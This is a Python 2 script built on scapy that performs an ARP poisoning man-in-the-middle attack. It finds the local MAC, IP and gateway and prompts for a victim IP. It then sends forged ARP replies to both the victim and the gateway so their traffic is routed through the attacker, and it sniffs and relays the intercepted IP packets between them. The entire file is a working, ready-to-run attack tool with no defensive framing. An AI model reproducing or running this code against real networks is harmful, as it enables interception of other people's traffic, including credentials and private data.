#sudo python arp_poison.py
#2016.8.4

import socket
from scapy.all import *
import os
import subprocess
import shlex
import fcntl
import struct
import string
import thread
import time

#======================= Get My IP,MAC and Gateway IP section ==========================
def Mac_address(ifname):
	s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(),0x8927,struct.pack('256s',ifname[:15]))
	myMac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
	return myMac

def Ip_address(ifname):
	s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(),0x8927,struct.pack('256s',ifname[:15]))
	myIp = socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])
	return myIp

strs = subprocess.check_output(shlex.split('ip r l'))
gateway = strs.split('default via')[-1].split()[0].split('/')[0]		# gateway ip(gateway)

My_Macaddr = Mac_address('enp0s5')			# my Mac_address (My_Macaddr)
My_ipaddr = Ip_address('enp0s5')			# my Ip_address (My_ipaddr)
print "=====MAC, IP ,gateway====="
print "MAC:"+My_Macaddr
print "IP:"+My_ipaddr
print "Gateway IP:"+gateway
print "=========================="
#======================== Send broadcast packet section ==================
p_dst = raw_input("input destination ip:")

second_packet = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=gateway)) 
gateway_mac = second_packet[0][0][1][Ether].src          # gateway mac (gateway_mac)

first_packet = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=p_dst ))
source = first_packet[0][0][1][Ether].src 			# sender source mac (source)
psource = first_packet[0][0][1][Ether].psrc         # sender ip (psource)

#============================= Relay packet section ========================
def send_packet(packet):
	print "sniff"
	if( packet[0][1].src == psource and packet[0][1].dst != My_ipaddr ): 	# if senderip && my mac 
		packet[0][0].src = My_Macaddr
		packet[0][0].dst = gateway_mac
		sendp(packet)
		print "send to gateway" 
	elif( packet[0][1].src != My_ipaddr and packet[0][1].dst == psource ): # if gatewayip && my mac
		packet[0][0].src = My_Macaddr
		packet[0][0].dst = source
		sendp(packet)
		print "send to victim"
def send_infection_packet(source,gateway_mac,My_Macaddr,gateway,psource):
	third_packet = srp( Ether(dst=source)/ARP(op=2,hwsrc=My_Macaddr,psrc=gateway,hwdst=source ,pdst=psource ),timeout=1)		  # send to sender
	fourth_packet = srp( Ether(dst=gateway_mac)/ARP(op=2,hwsrc=My_Macaddr,psrc=psource,hwdst=gateway_mac,pdst=gateway),timeout=1) # send to target	
	
	print "send packet!"
	time.sleep(1)

thread.start_new_thread(send_infection_packet,(source,gateway_mac,My_Macaddr,gateway,psource))
sniff(filter='ip',prn=send_packet)


